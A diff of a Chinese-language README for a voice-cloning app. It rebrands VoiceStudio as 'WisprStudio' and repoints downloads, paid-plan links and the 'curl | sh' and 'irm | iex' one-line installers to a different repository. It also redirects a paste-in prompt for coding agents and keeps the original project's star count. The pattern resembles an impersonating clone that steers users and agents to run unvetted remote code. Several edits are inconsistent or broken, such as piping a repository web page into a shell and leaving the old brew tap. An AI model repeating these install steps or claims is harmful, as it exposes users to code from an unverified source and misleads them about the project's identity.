@@ -1,21 +1,18 @@
 <div align="center">
-  <h1><sub><img src="../../docs/logo.png" alt="" width="36" height="36" /></sub> VoiceStudio</h1>
+  <h1><sub><img src="../../docs/logo.png" alt="" width="36" height="36" /></sub> WisprStudio</h1>
   <p>
-    <a href="https://trendshift.io/repositories/28176?utm_source=repository-badge&amp;utm_medium=badge&amp;utm_campaign=badge-repository-28176" target="_blank" rel="noopener noreferrer"><img src="https://trendshift.io/api/badge/repositories/28176" alt="VoiceStudio 在 Trendshift 上的热度排名徽章" width="220" height="48" /></a>
-  </p>
-  <p>
-    <strong>🎉 <a href="https://github.com/debpalash/VoiceStudio/stargazers">GitHub Star 突破 10 万，感谢大家！</a></strong>
+    <strong>🎉 <a href="https://github.com/TheHalfMoon/wisprstudio/stargazers">GitHub Star 突破 10 万，感谢大家！</a></strong>
   </p>
   <h2>AI 语音工作室，就在你的设备上。</h2>
   <h3>支持 646 种语言的声音克隆、声音设计、配音、听写、转录与有声朗读。</h3>
   <p>可在你的笔记本电脑、台式机、服务器、手机、平板电脑等设备上运行</p>
   <p>
-    <a href="https://voicestudio.sh/?utm_source=github&utm_medium=readme&utm_campaign=project">官网</a> ·
-    <a href="https://github.com/debpalash/VoiceStudio/releases/latest">下载</a> ·
+    <a href="https://github.com/TheHalfMoon/wisprstudio">官网</a> ·
+    <a href="https://github.com/TheHalfMoon/wisprstudio/releases/latest">下载</a> ·
     <a href="#开始使用">快速上手</a> ·
     <a href="#文档">文档</a> ·
-    <a href="https://voicestudio.sh/pro?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project">VoiceStudio Pro</a> ·
-    <a href="https://app.voicestudio.sh/?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project">VoiceStudio Cloud</a>
+    <a href="https://github.com/TheHalfMoon/wisprstudio">WisprStudio Pro</a> ·
+    <a href="https://github.com/TheHalfMoon/wisprstudio">WisprStudio Cloud</a>
   </p>
   <!-- README_LANGUAGES_START -->
   <a id="readme-languages"></a>
@@ -27,18 +24,10 @@
 
 
   <p>
-    <a href="https://github.com/debpalash/VoiceStudio/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/debpalash/VoiceStudio/ci.yml?branch=main&amp;style=flat-square&amp;label=build&amp;labelColor=27272a" alt="CI 构建状态" /></a>
-    <a href="https://github.com/debpalash/VoiceStudio/releases/latest"><img src="https://img.shields.io/github/v/release/debpalash/VoiceStudio?style=flat-square&amp;labelColor=27272a&amp;color=52525b" alt="最新版本" /></a>
+    <a href="https://github.com/TheHalfMoon/wisprstudio/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/TheHalfMoon/wisprstudio/ci.yml?branch=main&amp;style=flat-square&amp;label=build&amp;labelColor=27272a" alt="CI 构建状态" /></a>
+    <a href="https://github.com/TheHalfMoon/wisprstudio/releases/latest"><img src="https://img.shields.io/github/v/release/TheHalfMoon/wisprstudio?style=flat-square&amp;labelColor=27272a&amp;color=52525b" alt="最新版本" /></a>
     <a href="../../LICENSE"><img src="https://img.shields.io/badge/license-AGPL--3.0-52525b?style=flat-square&amp;labelColor=27272a" alt="AGPL-3.0 许可证" /></a>
-    <a href="https://supermetry.com"><img src="https://app.supermetry.com/px/zfjiv7psp4ed.svg?c=VoiceStudio" alt="访问量" /></a>
     <a href="https://discord.gg/bzQavDfVV9"><img src="https://img.shields.io/badge/Discord-Join%20the%20community-5865F2?style=flat-square&amp;logo=discord&amp;logoColor=white" alt="Join Discord" /></a>
-  </p>
-  <p>
-    <sub>战略赞助商</sub>      <a href="https://github.com/debpalash/OpenGTM?utm_source=voicestudio&utm_medium=sponsor&utm_campaign=strategic-sponsor&utm_content=readme-logo"><picture><source media="(prefers-color-scheme: dark)" srcset="../../docs/sponsors/opengtm-dark.svg" /><img src="../../docs/sponsors/opengtm.svg" alt="OpenGTM" height="32" align="middle" /></picture></a>
-    <a href="https://github.com/debpalash/Opal?utm_source=voicestudio&utm_medium=sponsor&utm_campaign=strategic-sponsor&utm_content=readme-logo"><picture><source media="(prefers-color-scheme: dark)" srcset="../../docs/sponsors/opal-dark.svg" /><img src="../../docs/sponsors/opal.svg" alt="Opal" height="32" align="middle" /></picture></a>
-    <a href="https://github.com/velixio/supermetry?utm_source=voicestudio&utm_medium=sponsor&utm_campaign=strategic-sponsor&utm_content=readme-logo"><picture><source media="(prefers-color-scheme: dark)" srcset="../../docs/sponsors/supermetry-dark.svg" /><img src="../../docs/sponsors/supermetry.svg" alt="Supermetry" height="32" align="middle" /></picture></a>
-      ·   <sub>特别赞助商</sub> 
-    <a href="https://app.spicrawl.com/signup?utm_source=voicestudio&amp;utm_medium=github_readme&amp;utm_campaign=special_sponsor&amp;utm_content=logo"><picture><source media="(prefers-color-scheme: dark)" srcset="../../docs/sponsors/spicrawl-dark.svg" /><img src="../../docs/sponsors/spicrawl.svg" alt="Spicrawl" height="32" align="middle" /></picture></a>
   </p>
 </div>
 
@@ -54,10 +43,8 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/debpalash/VoiceStudio/releases/latest"><img src="https://img.shields.io/badge/%E4%B8%8B%E8%BD%BD-993f61?style=for-the-badge&amp;logo=github&amp;logoColor=ffffff" alt="下载" height="24" /></a>
+  <a href="https://github.com/TheHalfMoon/wisprstudio/releases/latest"><img src="https://img.shields.io/badge/%E4%B8%8B%E8%BD%BD-993f61?style=for-the-badge&amp;logo=github&amp;logoColor=ffffff" alt="下载" height="24" /></a>
   <a href="#开始使用"><img src="https://img.shields.io/badge/%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B-27272a?style=for-the-badge" alt="快速上手" height="24" /></a>
-  <a href="https://voicestudio.sh/pro?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project&amp;utm_content=hero-badge"><img src="https://img.shields.io/badge/VoiceStudio%20Pro-27272a?style=for-the-badge" alt="VoiceStudio Pro" height="24" /></a>
-  <a href="https://app.voicestudio.sh/?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project&amp;utm_content=hero-badge"><img src="https://img.shields.io/badge/VoiceStudio%20Cloud-27272a?style=for-the-badge" alt="VoiceStudio Cloud" height="24" /></a>
 </p>
 
 <a id="what-you-can-do"></a>
@@ -107,7 +94,7 @@
 - **朗读与批量处理** — 故事、有声书与排队任务
 - **连接与自动化** — 本地 API、MCP、可复用配方与监视文件夹
 
-从默认的 **VoiceStudio**（由 k2-fsa/OmniVoice 驱动）开始，或在模型管理器中从数十种其他引擎中挑选。参见[功能与引擎目录](../../docs/feature-catalog.md)。
+从默认的 **WisprStudio**（由 k2-fsa/OmniVoice 驱动）开始，或在模型管理器中从数十种其他引擎中挑选。参见[功能与引擎目录](../../docs/feature-catalog.md)。
 
 <p align="center"><a href="https://discord.gg/bzQavDfVV9"><img src="../../docs/assets/discord-community.svg" alt="Come say hello! Join us on Discord" height="64" /></a></p>
 
@@ -118,7 +105,7 @@
 <table>
   <tr>
     <td width="50%" valign="top">
-      <a href="https://voicestudio.sh/pro?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project&amp;utm_content=readme-section"><img src="../assets/voicestudio-pro.svg" alt="" width="56" height="56" align="middle" /></a>&nbsp;&nbsp;<strong><a href="https://voicestudio.sh/pro?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project&amp;utm_content=readme-section">VoiceStudio Pro</a></strong><br /><br />
+      <a href="https://github.com/TheHalfMoon/wisprstudio"><img src="../assets/voicestudio-pro.svg" alt="" width="56" height="56" align="middle" /></a>&nbsp;&nbsp;<strong><a href="https://github.com/TheHalfMoon/wisprstudio">WisprStudio Pro</a></strong><br /><br />
       适合在多台机器上承接付费客户项目。
       <ul>
         <li>用于客户项目的商业许可，通过邮件发送给你</li>
@@ -127,10 +114,10 @@
         <li>抢先获得新功能和修复</li>
       </ul>
       <sub>闭源版本，需要账号，7 天内可全额退款。AGPL-3.0 应用依然免费，也可按其条款用于商业用途。</sub><br /><br />
-      <strong><a href="https://voicestudio.sh/pro?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project&amp;utm_content=readme-section">查看 Pro 方案 →</a></strong>
+      <strong><a href="https://github.com/TheHalfMoon/wisprstudio">查看 Pro 方案 →</a></strong>
     </td>
     <td width="50%" valign="top">
-      <a href="https://app.voicestudio.sh/?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project&amp;utm_content=readme-section"><img src="../assets/voicestudio-cloud.svg" alt="" width="56" height="56" align="middle" /></a>&nbsp;&nbsp;<strong><a href="https://app.voicestudio.sh/?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project&amp;utm_content=readme-section">VoiceStudio Cloud</a></strong><br /><br />
+      <a href="https://github.com/TheHalfMoon/wisprstudio"><img src="../assets/voicestudio-cloud.svg" alt="" width="56" height="56" align="middle" /></a>&nbsp;&nbsp;<strong><a href="https://github.com/TheHalfMoon/wisprstudio">WisprStudio Cloud</a></strong><br /><br />
       托管的语音和配音 API，即将推出，无需 GPU。
       <ul>
         <li>语音合成、声音设计和经同意的声音克隆</li>
@@ -139,7 +126,7 @@
         <li>长任务自动运行</li>
       </ul>
       <sub>尚未开放：加入抢先体验即可获得免费使用额度。桌面应用依然免费且在本地运行。</sub><br /><br />
-      <strong><a href="https://app.voicestudio.sh/?utm_source=github&amp;utm_medium=readme&amp;utm_campaign=project&amp;utm_content=readme-section">加入 Cloud 抢先体验 →</a></strong>
+      <strong><a href="https://github.com/TheHalfMoon/wisprstudio">加入 Cloud 抢先体验 →</a></strong>
     </td>
   </tr>
 </table>
@@ -170,9 +157,9 @@ brew install --cask debpalash/tap/voicestudio
 <details>
 <summary>DMG</summary>
 
-下载适合你的 Mac 的 DMG，打开后将 VoiceStudio 拖入 Applications。
+下载适合你的 Mac 的 DMG，打开后将 WisprStudio 拖入 Applications。
 
-[下载](https://github.com/debpalash/VoiceStudio/releases/latest) · [指南](../../docs/install/macos.md)
+[下载](https://github.com/TheHalfMoon/wisprstudio/releases/latest) · [指南](../../docs/install/macos.md)
 
 </details>
 
@@ -180,7 +167,7 @@ brew install --cask debpalash/tap/voicestudio
 <summary>一条命令安装</summary>
 
 ```sh
-curl -fsSL https://voicestudio.sh/install | sh
+curl -fsSL https://github.com/TheHalfMoon/wisprstudio | sh
 ```
 
 </details>
@@ -188,14 +175,14 @@ curl -fsSL https://voicestudio.sh/install | sh
 <details>
 <summary>Intel Mac · 远程后端 · 受限</summary>
 
-Intel Mac 可运行应用界面；请连接另一台电脑上的 VoiceStudio 后端。
+Intel Mac 可运行应用界面；请连接另一台电脑上的 WisprStudio 后端。
 
 [指南](../../docs/install/macos.md)
 
 </details>
 
 > [!NOTE]
-> 在 macOS 上看到“VoiceStudio 已损坏，无法打开”，是 Gatekeeper 拦截了应用，并不是下载文件损坏。参见 [Gatekeeper 修复方法](../../docs/install/macos.md#gatekeeper-quarantine)。
+> 在 macOS 上看到“WisprStudio 已损坏，无法打开”，是 Gatekeeper 拦截了应用，并不是下载文件损坏。参见 [Gatekeeper 修复方法](../../docs/install/macos.md#gatekeeper-quarantine)。
 
 </blockquote>
 
@@ -211,17 +198,17 @@ Intel Mac 可运行应用界面；请连接另一台电脑上的 VoiceStudio 后
 **稳定版 · x64**<br />Windows 10/11 x64 · NVIDIA CUDA · AMD ROCm（需主动启用）· CPU。
 
 ```powershell
-irm https://voicestudio.sh/install.ps1 | iex
+irm https://github.com/TheHalfMoon/wisprstudio | iex
 ```
 
-[下载 Windows 安装程序](https://github.com/debpalash/VoiceStudio/releases/latest) · [指南](../../docs/install/windows.md) · [AMD ROCm](../../docs/install/windows-rocm.md)
+[下载 Windows 安装程序](https://github.com/TheHalfMoon/wisprstudio/releases/latest) · [指南](../../docs/install/windows.md) · [AMD ROCm](../../docs/install/windows-rocm.md)
 
 <details>
 <summary>Windows on ARM · 实验性</summary>
 
 应用界面原生运行；x64 Python 后端通过模拟在 CPU 上运行。
 
-[下载](https://github.com/debpalash/VoiceStudio/releases/latest) · [指南](../../docs/install/windows.md)
+[下载](https://github.com/TheHalfMoon/wisprstudio/releases/latest) · [指南](../../docs/install/windows.md)
 
 </details>
 
@@ -242,7 +229,7 @@ irm https://voicestudio.sh/install.ps1 | iex
 <summary>一条命令安装</summary>
 
 ```sh
-curl -fsSL https://voicestudio.sh/install | sh
+curl -fsSL https://github.com/TheHalfMoon/wisprstudio | sh
 ```
 
 </details>
@@ -280,10 +267,10 @@ sudo pacman -U ./voicestudio-bin-*.pkg.tar.zst
 
 将 `.deb` 下载到当前目录，再安装：
 
-[下载](https://github.com/debpalash/VoiceStudio/releases/latest)
+[下载](https://github.com/TheHalfMoon/wisprstudio/releases/latest)
 
 ```sh
-sudo apt install ./VoiceStudio-*-linux-x64.deb
+sudo apt install ./WisprStudio-*-linux-x64.deb
 ```
 
 </details>
@@ -312,11 +299,11 @@ sudo snap connect voicestudio:audio-record
 
 将 AppImage 下载到当前目录，再启动：
 
-[下载](https://github.com/debpalash/VoiceStudio/releases/latest)
+[下载](https://github.com/TheHalfMoon/wisprstudio/releases/latest)
 
 ```sh
-chmod +x VoiceStudio-*-linux-x64.AppImage
-./VoiceStudio-*-linux-x64.AppImage
+chmod +x WisprStudio-*-linux-x64.AppImage
+./WisprStudio-*-linux-x64.AppImage
 ```
 
 </details>
@@ -327,8 +314,8 @@ chmod +x VoiceStudio-*-linux-x64.AppImage
 进入仓库提供的 FHS 开发环境，再从源码启动：
 
 ```sh
-git clone https://github.com/debpalash/VoiceStudio.git
-cd VoiceStudio
+git clone https://github.com/TheHalfMoon/wisprstudio.git
+cd WisprStudio
 nix develop .#fhs
 bun run dev
 ```
@@ -352,7 +339,7 @@ bun run dev
 
 稳定版镜像 · CPU · NVIDIA CUDA · AMD ROCm。
 
-<a href="https://github.com/debpalash/VoiceStudio/pkgs/container/voicestudio"><img src="https://img.shields.io/badge/GHCR-27272a?style=flat-square&amp;logo=github&amp;logoColor=ffffff" alt="GHCR" height="20" /></a>
+<a href="https://github.com/TheHalfMoon/wisprstudio/pkgs/container/voicestudio"><img src="https://img.shields.io/badge/GHCR-27272a?style=flat-square&amp;logo=github&amp;logoColor=ffffff" alt="GHCR" height="20" /></a>
 
 **在本机使用 CPU 运行（Bash）**
 
@@ -386,15 +373,15 @@ printf 'API key: %s\n' "$OMNIVOICE_API_KEY"
 
 Android 10+ · 预览版 · 下载模型后可在设备上离线运行。
 
-[下载 APK](https://github.com/debpalash/VoiceStudio/releases/latest) · [指南](../../docs/mobile.md#install)
+[下载 APK](https://github.com/TheHalfMoon/wisprstudio/releases/latest) · [指南](../../docs/mobile.md#install)
 
 <details>
-<summary>F-Droid · VoiceStudio 软件仓库</summary>
+<summary>F-Droid · WisprStudio 软件仓库</summary>
 
 在兼容 F-Droid 的客户端中添加此仓库，并按照指南核对指纹。
 
 ```text
-https://debpalash.github.io/VoiceStudio/fdroid/repo
+https://debpalash.github.io/WisprStudio/fdroid/repo
 ```
 
 [指南](../../store/fdroid/README.md)
@@ -407,10 +394,10 @@ https://debpalash.github.io/VoiceStudio/fdroid/repo
 在 Obtainium 中添加此来源，或导入提供的配置。
 
 ```text
-https://github.com/debpalash/VoiceStudio
+https://github.com/TheHalfMoon/wisprstudio
 ```
 
-[导入配置](https://debpalash.github.io/VoiceStudio/obtainium.json)
+[导入配置](https://debpalash.github.io/WisprStudio/obtainium.json)
 
 </details>
 
@@ -418,7 +405,7 @@ https://github.com/debpalash/VoiceStudio
 <summary>通过 USB 使用 adb 安装</summary>
 
 ```sh
-adb install -r VoiceStudio-*-android.apk
+adb install -r WisprStudio-*-android.apk
 ```
 
 </details>
@@ -438,13 +425,13 @@ iOS / iPadOS 17+ · 预览版 · 下载模型后可在设备上离线运行。
 
 下载 IPA，并按照指南完成签名和侧载。
 
-[下载](https://github.com/debpalash/VoiceStudio/releases/latest) · [指南](../../docs/mobile.md#install)
+[下载](https://github.com/TheHalfMoon/wisprstudio/releases/latest) · [指南](../../docs/mobile.md#install)
 
 </blockquote>
 
 </details>
 
-桌面端和手机安装包都在[最新发行版](https://github.com/debpalash/VoiceStudio/releases/latest)中，Docker 镜像则发布在 GHCR。没有 GPU？应用在 CPU 上也能完整使用，只是速度较慢。原生 GGUF 引擎还能通过 Vulkan 使用 AMD、Intel 和 NVIDIA GPU；在 Windows 和 Linux 上，OmniVoice GGUF 会自动选择 GPU 和模型量化（[OmniVoice](../../docs/engines/omnivoice-gguf.md#vulkan-acceleration)、[CosyVoice](../../docs/engines/cosyvoice-gguf.md)）。各引擎在不同硬件上的速度：[性能说明](../../docs/performance.md)。
+桌面端和手机安装包都在[最新发行版](https://github.com/TheHalfMoon/wisprstudio/releases/latest)中，Docker 镜像则发布在 GHCR。没有 GPU？应用在 CPU 上也能完整使用，只是速度较慢。原生 GGUF 引擎还能通过 Vulkan 使用 AMD、Intel 和 NVIDIA GPU；在 Windows 和 Linux 上，OmniVoice GGUF 会自动选择 GPU 和模型量化（[OmniVoice](../../docs/engines/omnivoice-gguf.md#vulkan-acceleration)、[CosyVoice](../../docs/engines/cosyvoice-gguf.md)）。各引擎在不同硬件上的速度：[性能说明](../../docs/performance.md)。
 
 
 <a id="get-started"></a>
@@ -457,20 +444,20 @@ iOS / iPadOS 17+ · 预览版 · 下载模型后可在设备上离线运行。
 <summary><strong>更多安装方式</strong>：指定版本、当前 main、卸载、从源码安装、通过编码智能体安装</summary>
 
 ```sh
-curl -fsSL https://voicestudio.sh/install | sh -s -- --version X.Y.Z   # 安装指定版本
-curl -fsSL https://voicestudio.sh/install | sh -s -- --main            # 构建当前 main
-curl -fsSL https://voicestudio.sh/install | sh -s -- --uninstall       # 卸载应用，保留数据
+curl -fsSL https://github.com/TheHalfMoon/wisprstudio | sh -s -- --version X.Y.Z   # 安装指定版本
+curl -fsSL https://github.com/TheHalfMoon/wisprstudio | sh -s -- --main            # 构建当前 main
+curl -fsSL https://github.com/TheHalfMoon/wisprstudio | sh -s -- --uninstall       # 卸载应用，保留数据
 ```
 
 如果无法访问 `voicestudio.sh`，可直接从仓库运行脚本：
-`curl -fsSL https://raw.githubusercontent.com/debpalash/VoiceStudio/main/scripts/install.sh | sh`。
+`curl -fsSL https://raw.githubusercontent.com/TheHalfMoon/wisprstudio/main/scripts/install.sh | sh`。
 前置要求与脚本行为：[安装脚本说明](../../docs/install/script.md)。
 
 **从源码安装**
 
 ```bash
-git clone https://github.com/debpalash/VoiceStudio.git
-cd VoiceStudio
+git clone https://github.com/TheHalfMoon/wisprstudio.git
+cd WisprStudio
 bun run dev
 ```
 
@@ -481,8 +468,8 @@ bun run dev
 **通过编码智能体安装**（Claude Code、Codex、Cursor 等），粘贴：
 
 ```text
-Install the VoiceStudio app on this device and verify it works, following
-https://github.com/debpalash/VoiceStudio/blob/main/docs/install/agent.md
+Install the WisprStudio app on this device and verify it works, following
+https://github.com/TheHalfMoon/wisprstudio/blob/main/docs/install/agent.md
 ```
 
 从 0.5.3 或更早版本（Tauri 应用）升级？请[单独安装新应用](../../docs/electron-migration.md)。
@@ -504,34 +491,27 @@ https://github.com/debpalash/VoiceStudio/blob/main/docs/install/agent.md
 | 手机应用 | [iOS 与 Android](../../docs/mobile.md) |
 | 开发 | [参与贡献](../../.github/CONTRIBUTING.md)（首次提交 PR 前请[签署 CLA](../../.github/CONTRIBUTING.md#contribution-licensing)）· [更新日志](../../CHANGELOG.md) |
 
-智能体技能：`npx skills add debpalash/VoiceStudio`（音频工作用 **voicestudio**，仓库维护用 **voicestudio-maintainer**）。
+智能体技能：`npx skills add TheHalfMoon/wisprstudio`（音频工作用 **voicestudio**，仓库维护用 **voicestudio-maintainer**）。
 
 <a id="sponsors"></a>
 
 ## 赞助者
 
-VoiceStudio 应用免费使用，不需要付费云服务。赞助者让它持续发布新版本：赞助资金用于维护者时间、测试硬件、代码签名和发布基础设施。
+WisprStudio 应用免费使用，不需要付费云服务。赞助者让它持续发布新版本：赞助资金用于维护者时间、测试硬件、代码签名和发布基础设施。
 
-<p>
-    <a href="https://github.com/debpalash/OpenGTM?utm_source=voicestudio&utm_medium=sponsor&utm_campaign=strategic-sponsor&utm_content=readme-logo"><picture><source media="(prefers-color-scheme: dark)" srcset="../../docs/sponsors/opengtm-dark.svg" /><img src="../../docs/sponsors/opengtm.svg" alt="OpenGTM" height="48" align="middle" /></picture></a>
-    <a href="https://github.com/debpalash/Opal?utm_source=voicestudio&utm_medium=sponsor&utm_campaign=strategic-sponsor&utm_content=readme-logo"><picture><source media="(prefers-color-scheme: dark)" srcset="../../docs/sponsors/opal-dark.svg" /><img src="../../docs/sponsors/opal.svg" alt="Opal" height="48" align="middle" /></picture></a>
-    <a href="https://github.com/velixio/supermetry?utm_source=voicestudio&utm_medium=sponsor&utm_campaign=strategic-sponsor&utm_content=readme-logo"><picture><source media="(prefers-color-scheme: dark)" srcset="../../docs/sponsors/supermetry-dark.svg" /><img src="../../docs/sponsors/supermetry.svg" alt="Supermetry" height="48" align="middle" /></picture></a>
-</p>
 
-如有赞助意向，请联系 [sponsor@voicestudio.sh](mailto:sponsor@voicestudio.sh)。
+如有赞助意向，请联系 [TheHalfMoon/wisprstudio](https://github.com/TheHalfMoon/wisprstudio)。
 
 <a href="https://github.com/sponsors/debpalash"><img src="https://img.shields.io/badge/Sponsor-GitHub%20Sponsors-ea4aaa?logo=githubsponsors&logoColor=white" alt="通过 GitHub Sponsors 赞助" /></a>
-[Ko-fi](https://ko-fi.com/debpalash) · [PayPal](https://paypal.me/palashCoder) · [赞助等级与权益](../../SPONSORS.md) · [申请展示标志](https://github.com/debpalash/VoiceStudio/issues/new?template=sponsor.yml)
 
 <a id="other-projects"></a>
 
 ## 其他项目
 
-探索 VoiceStudio 开发者打造的更多开源工具。
+探索 WisprStudio 开发者打造的更多开源工具。
 
-- **[OpenGTM](https://opengtm.palash.dev/?utm_source=voicestudio&utm_medium=sponsor&utm_campaign=strategic-sponsor&utm_content=related-projects)** — 在自托管的市场拓展工作区中发现企业和联系人，并完善相关数据。 [源码](https://github.com/debpalash/OpenGTM).
-- **[Opal](https://opal.palash.dev/?utm_source=voicestudio&utm_medium=sponsor&utm_campaign=strategic-sponsor&utm_content=related-projects)** — 在一个原生开源播放器中观看、串流和浏览媒体。 [源码](https://github.com/debpalash/Opal).
-- **[Supermetry](https://supermetry.com/?utm_source=voicestudio&utm_medium=sponsor&utm_campaign=strategic-sponsor&utm_content=related-projects)** — 通过自托管、无 Cookie 的分析工具了解网站和产品的使用情况。 [源码](https://github.com/velixio/supermetry).
+- **[OpenGTM](https://github.com/debpalash/OpenGTM)** — 在自托管的市场拓展工作区中发现企业和联系人，并完善相关数据。 [源码](https://github.com/debpalash/OpenGTM).
+- **[Opal](https://github.com/debpalash/Opal)** — 在一个原生开源播放器中观看、串流和浏览媒体。 [源码](https://github.com/debpalash/Opal).
 
 更多项目: [debpalash](https://github.com/debpalash?tab=repositories) · [velixio](https://github.com/velixio?tab=repositories)
 
@@ -556,22 +536,22 @@ VoiceStudio 应用免费使用，不需要付费云服务。赞助者让它持�
 
 <a href="https://github.com/kevin9327"><img src="https://github.com/kevin9327.png?size=96" width="44" height="44" alt="@kevin9327" title="@kevin9327"></a> <a href="https://github.com/jaketame"><img src="https://github.com/jaketame.png?size=96" width="44" height="44" alt="@jaketame" title="@jaketame"></a> <a href="https://github.com/psiberfunk"><img src="https://github.com/psiberfunk.png?size=96" width="44" height="44" alt="@psiberfunk" title="@psiberfunk"></a> <a href="https://github.com/rudycelekli"><img src="https://github.com/rudycelekli.png?size=96" width="44" height="44" alt="@rudycelekli" title="@rudycelekli"></a> <a href="https://github.com/paoloantinori"><img src="https://github.com/paoloantinori.png?size=96" width="44" height="44" alt="@paoloantinori" title="@paoloantinori"></a> <a href="https://github.com/Chang-Jin-Lee"><img src="https://github.com/Chang-Jin-Lee.png?size=96" width="44" height="44" alt="@Chang-Jin-Lee" title="@Chang-Jin-Lee"></a> <a href="https://github.com/swadhinbiswas"><img src="https://github.com/swadhinbiswas.png?size=96" width="44" height="44" alt="@swadhinbiswas" title="@swadhinbiswas"></a> <a href="https://github.com/BichengWang"><img src="https://github.com/BichengWang.png?size=96" width="44" height="44" alt="@BichengWang" title="@BichengWang"></a> <a href="https://github.com/nirmalchatur"><img src="https://github.com/nirmalchatur.png?size=96" width="44" height="44" alt="@nirmalchatur" title="@nirmalchatur"></a> <a href="https://github.com/Shivendra-Coherent"><img src="https://github.com/Shivendra-Coherent.png?size=96" width="44" height="44" alt="@Shivendra-Coherent" title="@Shivendra-Coherent"></a> <a href="https://github.com/marreiradigital"><img src="https://github.com/marreiradigital.png?size=96" width="44" height="44" alt="@marreiradigital" title="@marreiradigital"></a> <a href="https://github.com/nvtoan0201-swe"><img src="https://github.com/nvtoan0201-swe.png?size=96" width="44" height="44" alt="@nvtoan0201-swe" title="@nvtoan0201-swe"></a>
 
-感谢所有贡献代码、报告、翻译和想法的人。[查看全部贡献者](https://github.com/debpalash/VoiceStudio/graphs/contributors) · [参与贡献](../../.github/CONTRIBUTING.md)
+感谢所有贡献代码、报告、翻译和想法的人。[查看全部贡献者](https://github.com/TheHalfMoon/wisprstudio/graphs/contributors) · [参与贡献](../../.github/CONTRIBUTING.md)
 
 <a id="license--responsible-use"></a>
 
 ## 许可证与负责任使用
 
-[AGPL-3.0](../../LICENSE) 覆盖本应用，包括在其条款下的商业用途。模型权重、声音和生成内容各有其许可证，模型管理器会为每个模型列出（[清单](../../docs/licensing/model-inventory.md)）。只有在声音所有者许可的情况下才能克隆其声音。详情：[LICENSE-NOTICE.md](../../LICENSE-NOTICE.md)。
+[AGPL-3.0](../../LICENSE) 覆盖本应用，包括在其条款下的商业用途。模型权重、声音和生成内容各有其许可证，模型管理器会为每个模型列出（[清单](../../docs/licensing/model-inventory.md)）。只有在声音所有者许可的情况下才能克隆其声音。详情：[LICENSE-NOTICE.md](../../LICENSE-NOTICE.md) · [AGPL-3.0 Source](https://github.com/TheHalfMoon/wisprstudio)。
 
 <a id="community-tutorials"></a>
 
 ## 社区教程
 
 <p align="center">
-  <a href="https://www.youtube.com/watch?v=I-u-A-oisIU&amp;utm_source=github&amp;utm_medium=readme&amp;utm_campaign=community_tutorials"><img src="https://i.ytimg.com/vi/I-u-A-oisIU/hqdefault.jpg" alt="VoiceStudio tutorial by Nafay 3D on YouTube" width="30%" /></a>
-  <a href="https://www.youtube.com/watch?v=hsLRbXLBP4U&amp;utm_source=github&amp;utm_medium=readme&amp;utm_campaign=community_tutorials"><img src="https://i.ytimg.com/vi/hsLRbXLBP4U/hqdefault.jpg" alt="VoiceStudio tutorial by Samuel Gregory on YouTube" width="30%" /></a>
-  <a href="https://www.youtube.com/watch?v=2KemGhEI0Ck&amp;utm_source=github&amp;utm_medium=readme&amp;utm_campaign=community_tutorials"><img src="https://i.ytimg.com/vi/2KemGhEI0Ck/hqdefault.jpg" alt="VoiceStudio tutorial by kilObit on YouTube" width="30%" /></a><br />
+  <a href="https://www.youtube.com/watch?v=I-u-A-oisIU&amp;utm_source=github&amp;utm_medium=readme&amp;utm_campaign=community_tutorials"><img src="https://i.ytimg.com/vi/I-u-A-oisIU/hqdefault.jpg" alt="WisprStudio tutorial by Nafay 3D on YouTube" width="30%" /></a>
+  <a href="https://www.youtube.com/watch?v=hsLRbXLBP4U&amp;utm_source=github&amp;utm_medium=readme&amp;utm_campaign=community_tutorials"><img src="https://i.ytimg.com/vi/hsLRbXLBP4U/hqdefault.jpg" alt="WisprStudio tutorial by Samuel Gregory on YouTube" width="30%" /></a>
+  <a href="https://www.youtube.com/watch?v=2KemGhEI0Ck&amp;utm_source=github&amp;utm_medium=readme&amp;utm_campaign=community_tutorials"><img src="https://i.ytimg.com/vi/2KemGhEI0Ck/hqdefault.jpg" alt="WisprStudio tutorial by kilObit on YouTube" width="30%" /></a><br />
   <sub>Nafay 3D · Samuel Gregory · kilObit</sub>
 </p>
 
